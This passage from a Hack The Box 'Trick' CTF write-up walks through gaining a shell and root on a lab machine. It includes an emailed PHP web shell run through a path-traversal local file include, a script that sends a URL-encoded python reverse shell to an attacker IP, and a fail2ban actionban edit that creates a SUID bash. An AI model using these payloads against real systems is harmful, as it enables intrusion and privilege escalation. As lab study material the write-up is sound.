└─$ ssh michael@trick.htb -i id_rsa 
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ 
```

But am curious why there was smtp open lets see if michael is a valid smtp user

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ telnet trick.htb 25
Trying 10.10.11.166...
Connected to trick.htb.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
HELO pwner.localhost
250 debian.localdomain
VRFY michael    
252 2.0.0 michael
```

I can try sending michael a message using swaks

```
Command: swaks --to michael --from lol@10.10.16.7 --header 'Subject: Hello!' --body 'Are you there?' --server trick.htb
```

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$  swaks --to michael --from lol --header 'Subject: Hello' --body 'Are you there?' --server trick.htb
=== Trying trick.htb:25...
=== Connected to trick.htb.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO haxor
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<lol>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 07 Feb 2023 12:22:45 +0100
 -> To: michael
 -> From: lol
 -> Subject: Hello
 -> Message-Id: <20230207122245.154683@haxor>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> Are you there?
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 7EC0C4099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

Now using that lfi i can try to include this message

Boom it worked 
![image](https://user-images.githubusercontent.com/113513376/217231935-70122b68-e205-409d-8f56-7758b900ebc7.png)

With this i can get code execution by sending an email with a php execute code as the body content

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$  swaks --to michael --from lol --header 'Subject: Hello' --body '<?php system($_REQUEST["cmd"]); ?>' --server trick.htb
=== Trying trick.htb:25...
=== Connected to trick.htb.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO haxor
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<lol>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 07 Feb 2023 12:25:39 +0100
 -> To: michael
 -> From: lol
 -> Subject: Hello
 -> Message-Id: <20230207122539.155500@haxor>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 8A2874099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

But when i access it on the web browser and append `&cmd=whoami` it worked but after like a minute it clears 🙂

So the best thing is to use a script which will do the email sending and navigate to the url with the reverse shell

```
#!/bin/bash

swaks --to michael --from lol --header 'Subject: Hello' --body '<?php system($_REQUEST["cmd"]); ?>' --server trick.htb

url_encoded_reverse_shell='export%20RHOST%3D%2210.10.16.7%22%3Bexport%20RPORT%3D444%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27'

target_url="http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=$url_encoded_reverse_shell"

curl "$target_url"
```

It's not fancy but it worked for me

On running the bash script i have a listener on port 444

```
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ chmod +x script.sh
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ ./script.sh 
=== Trying trick.htb:25...
=== Connected to trick.htb.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO haxor
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<lol>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 07 Feb 2023 12:44:36 +0100
 -> To: michael
 -> From: lol
 -> Subject: Hello
 -> Message-Id: <20230207124436.160828@haxor>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 6EED14099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

It hangs and back on the listener

```
┌──(venv)─(mark__haxor)-[~/Downloads]
└─$ nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.166] 49324
michael@trick:/var/www/market$ whoami
whoami
michael
michael@trick:/var/www/market$ 
```

So thats another way to get shell 

Time for priv esc

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
michael@trick:~$
```

The user michael is among the security group and the security group is in charge of the fail2ban service which basically bans any ip that performs a bruteforce attack on a specific server which is likey ssh 🤔

Anyways i also have access to restart the fail2ban service as root

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$ 
```

Cool now i'll find the file to edit 

Looking at the directory security group has access to i see lots of file

```
michael@trick:/etc/fail2ban/action.d$ ls
abuseipdb.conf     dummy.conf                     hostsdeny.conf                       iptables-multiport.conf       mynetwatchman.conf       osx-ipfw.confsendmail-whois-ipmatches.conf
apf.conf           firewallcmd-allports.conf      ipfilter.conf                        iptables-multiport-log.conf   netscaler.conf           pf.confsendmail-whois-lines.conf
badips.conf        firewallcmd-common.conf        ipfw.conf                            iptables-new.conf             nftables-allports.conf   route.confsendmail-whois-matches.conf
badips.py          firewallcmd-ipset.conf         iptables-allports.conf               iptables-xt_recent-echo.conf  nftables-common.conf     sendmail-buffered.confshorewall.conf
blocklist_de.conf  firewallcmd-multiport.conf     iptables-common.conf                 mail-buffered.conf            nftables-multiport.conf  sendmail-common.confshorewall-ipset-proto6.conf
bsd-ipfw.conf      firewallcmd-new.conf           iptables.conf                        mail.conf                     nginx-block-map.conf     sendmail.confsmtp.py
cloudflare.conf    firewallcmd-rich-logging.conf  iptables-ipset-proto4.conf           mail-whois-common.conf        npf.conf                 sendmail-geoip-lines.confsymbiosis-blacklist-allports.conf
complain.conf      firewallcmd-rich-rules.conf    iptables-ipset-proto6-allports.conf  mail-whois.conf               nsupdate.conf            sendmail-whois.confufw.conf
dshield.conf       helpers-common.conf            iptables-ipset-proto6.conf           mail-whois-lines.conf         osx-afctl.conf           sendmail-whois-ipjailmatches.conf  xarf-login-attack.conf
michael@trick:/etc/fail2ban/action.d$ 
```

So I noticed that the files in here only root can edit it

```
michael@trick:/etc/fail2ban/action.d$ ls -al                                                                                                                                                                       
total 288                                                                                                                                                                                                          
drwxrwx--- 2 root security  4096 Feb  7 13:03 .
drwxr-xr-x 6 root root      4096 Feb  7 13:03 ..
-rw-r--r-- 1 root root      3879 Feb  7 13:03 abuseipdb.conf
-rw-r--r-- 1 root root       587 Feb  7 13:03 apf.conf
-rw-r--r-- 1 root root       629 Feb  7 13:03 badips.conf
-rw-r--r-- 1 root root     10918 Feb  7 13:03 badips.py
-rw-r--r-- 1 root root      2631 Feb  7 13:03 blocklist_de.conf
-rw-r--r-- 1 root root      3094 Feb  7 13:03 bsd-ipfw.conf
-rw-r--r-- 1 root root      2719 Feb  7 13:03 cloudflare.conf
-rw-r--r-- 1 root root      4669 Feb  7 13:03 complain.conf
-rw-r--r-- 1 root root      7580 Feb  7 13:03 dshield.conf
-rw-r--r-- 1 root root      1629 Feb  7 13:03 dummy.conf
-rw-r--r-- 1 root root      1501 Feb  7 13:03 firewallcmd-allports.conf
-rw-r--r-- 1 root root      2649 Feb  7 13:03 firewallcmd-common.conf
-rw-r--r-- 1 root root      2235 Feb  7 13:03 firewallcmd-ipset.conf
-rw-r--r-- 1 root root      1270 Feb  7 13:03 firewallcmd-multiport.conf
-rw-r--r-- 1 root root      1898 Feb  7 13:03 firewallcmd-new.conf
-rw-r--r-- 1 root root      2314 Feb  7 13:03 firewallcmd-rich-logging.conf
-rw-r--r-- 1 root root      1765 Feb  7 13:03 firewallcmd-rich-rules.conf
-rw-r--r-- 1 root root       589 Feb  7 13:03 helpers-common.conf
-rw-r--r-- 1 root root      1402 Feb  7 13:03 hostsdeny.conf
-rw-r--r-- 1 root root      1485 Feb  7 13:03 ipfilter.conf
-rw-r--r-- 1 root root      1417 Feb  7 13:03 ipfw.conf
-rw-r--r-- 1 root root      1426 Feb  7 13:03 iptables-allports.conf
-rw-r--r-- 1 root root      2738 Feb  7 13:03 iptables-common.conf
-rw-r--r-- 1 root root      1339 Feb  7 13:03 iptables.conf
-rw-r--r-- 1 root root      2000 Feb  7 13:03 iptables-ipset-proto4.conf
-rw-r--r-- 1 root root      2197 Feb  7 13:03 iptables-ipset-proto6-allports.conf
-rw-r--r-- 1 root root      2240 Feb  7 13:03 iptables-ipset-proto6.conf
-rw-r--r-- 1 root root      1420 Feb  7 13:03 iptables-multiport.conf
-rw-r--r-- 1 root root      2082 Feb  7 13:03 iptables-multiport-log.conf
-rw-r--r-- 1 root root      1497 Feb  7 13:03 iptables-new.conf
-rw-r--r-- 1 root root      2584 Feb  7 13:03 iptables-xt_recent-echo.conf
-rw-r--r-- 1 root root      2343 Feb  7 13:03 mail-buffered.conf
-rw-r--r-- 1 root root      1621 Feb  7 13:03 mail.conf
-rw-r--r-- 1 root root      1049 Feb  7 13:03 mail-whois-common.conf
-rw-r--r-- 1 root root      1754 Feb  7 13:03 mail-whois.conf
-rw-r--r-- 1 root root      2355 Feb  7 13:03 mail-whois-lines.conf
-rw-r--r-- 1 root root      5233 Feb  7 13:03 mynetwatchman.conf
-rw-r--r-- 1 root root      1493 Feb  7 13:03 netscaler.conf
-rw-r--r-- 1 root root       490 Feb  7 13:03 nftables-allports.conf
-rw-r--r-- 1 root root      4038 Feb  7 13:03 nftables-common.conf
-rw-r--r-- 1 root root       496 Feb  7 13:03 nftables-multiport.conf
-rw-r--r-- 1 root root      3697 Feb  7 13:03 nginx-block-map.conf
-rw-r--r-- 1 root root      1493 Feb  7 13:03 netscaler.conf
-rw-r--r-- 1 root root       490 Feb  7 13:03 nftables-allports.conf
-rw-r--r-- 1 root root      4038 Feb  7 13:03 nftables-common.conf
-rw-r--r-- 1 root root       496 Feb  7 13:03 nftables-multiport.conf
-rw-r--r-- 1 root root      3697 Feb  7 13:03 nginx-block-map.conf
-rw-r--r-- 1 root root      1436 Feb  7 13:03 npf.conf
-rw-r--r-- 1 root root      3146 Feb  7 13:03 nsupdate.conf
-rw-r--r-- 1 root root       469 Feb  7 13:03 osx-afctl.conf
-rw-r--r-- 1 root root      2214 Feb  7 13:03 osx-ipfw.conf
-rw-r--r-- 1 root root      3662 Feb  7 13:03 pf.conf
-rw-r--r-- 1 root root      1023 Feb  7 13:03 route.conf
-rw-r--r-- 1 root root      2830 Feb  7 13:03 sendmail-buffered.conf
-rw-r--r-- 1 root root      1824 Feb  7 13:03 sendmail-common.conf
-rw-r--r-- 1 root root       857 Feb  7 13:03 sendmail.conf
-rw-r--r-- 1 root root      1773 Feb  7 13:03 sendmail-geoip-lines.conf
-rw-r--r-- 1 root root       977 Feb  7 13:03 sendmail-whois.conf
-rw-r--r-- 1 root root      1052 Feb  7 13:03 sendmail-whois-ipjailmatches.conf
-rw-r--r-- 1 root root      1033 Feb  7 13:03 sendmail-whois-ipmatches.conf
-rw-r--r-- 1 root root      1300 Feb  7 13:03 sendmail-whois-lines.conf
-rw-r--r-- 1 root root       997 Feb  7 13:03 sendmail-whois-matches.conf
-rw-r--r-- 1 root root      2068 Feb  7 13:03 shorewall.conf
-rw-r--r-- 1 root root      2981 Feb  7 13:03 shorewall-ipset-proto6.conf
-rw-r--r-- 1 root root      6134 Feb  7 13:03 smtp.py
-rw-r--r-- 1 root root      1330 Feb  7 13:03 symbiosis-blacklist-allports.conf
-rw-r--r-- 1 root root      1045 Feb  7 13:03 ufw.conf
-rw-r--r-- 1 root root      6082 Feb  7 13:03 xarf-login-attack.conf
michael@trick:/etc/fail2ban/action.d$
```

Noticing that only root has access to edit this file but the whole directory the security group has access over it 

So here's what i did 

```
michael@trick:/etc/fail2ban/action.d$ echo lol > action.d/lol
michael@trick:/etc/fail2ban/action.d$ cp .. /dev/shm/lol
michael@trick:/etc/fail2ban/action.d$ cd
michael@trick:~$ cd /etc/fail2ban/action.d/
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf /dev/shm/lol.conf
michael@trick:/etc/fail2ban/action.d$ cd /dev/shm/
michael@trick:/dev/shm$ ls
lol.conf
michael@trick:/dev/shm$ 
```

Now i will edit the lol.conf to create an suid binary in /dev/shm directory [Resource](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

```
michael@trick:/dev/shm$ cat lol.conf | grep actionban
# Notes.:  command executed once before each actionban command
# Option:  actionban
actionban = cp /bin/bash /dev/shm/pwned; chmod +s /dev/shm/pwned
michael@trick:/dev/shm$ 
```

Now i will overwrite the real `iptables-multiport.conf` with `lol.conf`

```
michael@trick:/dev/shm$ cp lol.conf /etc/fail2ban/action.d/iptables-multiport.conf
cp: cannot create regular file '/etc/fail2ban/action.d/iptables-multiport.conf': Permission denied
michael@trick:/dev/shm$ cp lol.conf /etc/fail2ban/action.d/iptables-multiport.conf
cp: cannot create regular file '/etc/fail2ban/action.d/iptables-multiport.conf': Permission denied
michael@trick:/dev/shm$ ls
lol.conf
michael@trick:/dev/shm$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

But i don't know why it doesn't work so here's what i did again since we had access over that dir

```
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf iptables-multiport.conf.lol
michael@trick:/etc/fail2ban/action.d$ rm iptables-multiport.conf
rm: remove write-protected regular file 'iptables-multiport.conf'? y
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf.lol | grep ban
# Modified by Yaroslav Halchenko for multiport banning
# Notes.:  command executed once before each actionban command
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
actionban = cp /bin/bash /dev/shm; chmod +s /dev/shm/bash
# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.lol iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf | grep ban
# Modified by Yaroslav Halchenko for multiport banning
# Notes.:  command executed once before each actionban command
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
actionban = cp /bin/bash /dev/shm; chmod +s /dev/shm/bash
# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
michael@trick:/etc/fail2ban/action.d$ 
```

Cool looks like we have full access over it now and hv manipulated it🙂

Now i'll restart the service 

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$ sudo  /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Now to trigger the fail2ban i'll have to run a brute force attack on ssh

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ hydra -l lol -P /home/mark/Documents/rockyou.txt ssh://trick.htb -t 64
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-07 13:40:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://trick.htb:22/
[STATUS] 322.00 tries/min, 322 tries in 00:01h, 14344107 to do in 742:27h, 34 active
```

Now if we check the bash binary we see it has suid perm set on it 

```
michael@trick:~$ ls -l /dev/shm/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /dev/shm/bash
michael@trick:~$ 
```

We can easily get root from this

```
michael@trick:/dev/shm$ ./bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
bash-5.0# cd /root
bash-5.0# ls -al
total 56
drwx------  8 root root 4096 Jun  7  2022 .
drwxr-xr-x 19 root root 4096 May 25  2022 ..
lrwxrwxrwx  1 root root    9 Apr 22  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 May 25  2022 .cache
drwx------  5 root root 4096 May 25  2022 .config
-rw-r--r--  1 root root  139 Apr 22  2022 f2b.sh
drwxr-xr-x  6 root root 4096 Jun 12  2022 fail2ban
drwx------  3 root root 4096 May 25  2022 .gnupg
drwxr-xr-x  3 root root 4096 May 25  2022 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   33 Feb  7 12:57 root.txt
-rw-r--r--  1 root root   66 Jun  7  2022 .selected_editor
-rwxr-xr-x  1 root root 1342 Jun  7  2022 set_dns.sh
drwx------  2 root root 4096 May 25  2022 .ssh
bash-5.0# cat root.txt
ff36c71230a4391742c699c287f56fb8
bash-5.0# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)


